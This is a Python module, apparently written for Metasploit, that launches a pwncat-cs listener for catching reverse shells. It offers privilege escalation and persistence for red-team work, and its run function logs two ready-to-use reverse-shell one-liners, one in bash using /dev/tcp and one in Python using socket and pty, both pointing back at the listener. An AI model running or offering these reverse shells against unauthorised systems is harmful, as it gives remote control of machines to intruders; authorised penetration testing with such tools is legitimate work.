#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
pwncat-cs Shell Listener Module

This module launches pwncat-cs as an advanced shell handler with automatic
privilege escalation, persistence, and post-exploitation capabilities.

Author: P4x-ng
License: MSF_LICENSE
"""

import logging
import sys
import os
import time

# Add path for framework imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(__file__))))

dependencies_missing = False
try:
    from metasploit import module
    from lib.msf.core.integrations.pwncat import PwncatIntegration
except ImportError:
    dependencies_missing = True


metadata = {
    'name': 'pwncat-cs Advanced Shell Listener',
    'description': '''
        Launch a pwncat-cs listener for catching reverse shells with advanced features.
        
        pwncat-cs is a modern shell handler that provides:
        - Automatic privilege escalation
        - Persistent shell management
        - File upload/download with progress tracking
        - Command history and tab completion
        - Automatic enumeration modules
        - Implant persistence capabilities
        
        This is a significant upgrade from basic netcat listeners, providing a
        professional post-exploitation platform that scales well for red team operations.
    ''',
    'authors': [
        'P4x-ng'
    ],
    'date': '2025-12-14',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://github.com/calebstewart/pwncat'},
        {'type': 'url', 'ref': 'https://pwncat.readthedocs.io/'}
    ],
    'type': 'single_scanner',
    'options': {
        'lhost': {
            'type': 'address',
            'description': 'Listener host address',
            'required': True,
            'default': '0.0.0.0'
        },
        'lport': {
            'type': 'port',
            'description': 'Listener port',
            'required': True,
            'default': 4444
        },
        'platform': {
            'type': 'enum',
            'description': 'Target platform (linux, windows, any)',
            'required': False,
            'default': 'linux',
            'values': ['linux', 'windows', 'any']
        },
        'runtime': {
            'type': 'int',
            'description': 'How long to run listener (seconds, 0=forever)',
            'required': False,
            'default': 0
        },
        'auto_enum': {
            'type': 'bool',
            'description': 'Run automatic enumeration on new sessions',
            'required': False,
            'default': False
        },
        'log_sessions': {
            'type': 'bool',
            'description': 'Log all session activity',
            'required': False,
            'default': True
        },
        'log_dir': {
            'type': 'string',
            'description': 'Directory for session logs',
            'required': False,
            'default': '/tmp/pwncat_sessions'
        }
    },
    'notes': {
        'Stability': ['CRASH_SAFE'],
        'Reliability': ['REPEATABLE_SESSION'],
        'SideEffects': ['IOC_IN_LOGS', 'ARTIFACTS_ON_DISK']
    }
}


def run(args):
    """Execute the pwncat-cs listener."""
    module.LogHandler.setup(msg_prefix='[pwncat] ')
    
    if dependencies_missing:
        logging.error('Module dependencies missing')
        return
    
    lhost = args.get('lhost', '0.0.0.0')
    lport = int(args.get('lport', 4444))
    platform = args.get('platform', 'linux')
    runtime = int(args.get('runtime', 0))
    auto_enum = args.get('auto_enum', False)
    log_sessions = args.get('log_sessions', True)
    log_dir = args.get('log_dir', '/tmp/pwncat_sessions')
    
    logging.info('Starting pwncat-cs shell listener')
    
    # Initialize pwncat
    config = {
        'lhost': lhost,
        'verbose': True,
        'log_sessions': log_sessions,
        'log_dir': log_dir
    }
    
    pwncat = PwncatIntegration(config)
    
    success, missing = pwncat.check_dependencies()
    if not success:
        logging.error(f'pwncat-cs dependencies missing: {missing}')
        logging.error('Install with: pip install pwncat-cs')
        return
    
    if not pwncat.initialize():
        logging.error('Failed to initialize pwncat-cs')
        return
    
    # Start listener
    try:
        result = pwncat.execute('listen', host=lhost, port=lport, protocol=platform)
        
        if not result.get('success'):
            logging.error(f"Failed to start listener: {result.get('error')}")
            return
        
        logging.info(f'Listener started on {lhost}:{lport}')
        logging.info(f'Platform: {platform}')
        logging.info(f'PID: {result.get("pid")}')
        logging.info('')
        logging.info('Waiting for connections...')
        logging.info('Send reverse shells to this listener using:')
        logging.info(f'  bash: bash -i >& /dev/tcp/{lhost}/{lport} 0>&1')
        logging.info(f'  python: python -c \'import socket,os,pty;s=socket.socket();s.connect(("{lhost}",{lport}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")\'')
        logging.info('')
        
        if auto_enum:
            logging.info('Automatic enumeration enabled')
        
        if log_sessions:
            logging.info(f'Session logs will be saved to: {log_dir}')
        
        # Run for specified time or forever
        if runtime > 0:
            logging.info(f'Running for {runtime} seconds...')
            time.sleep(runtime)
        else:
            logging.info('Running until interrupted (Ctrl+C)...')
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                logging.info('Interrupted by user')
        
        logging.info('')
        logging.info('Shutting down listener...')
    
    finally:
        pwncat.cleanup()
        logging.info('pwncat-cs listener stopped')


if __name__ == '__main__':
    module.run(metadata, run)
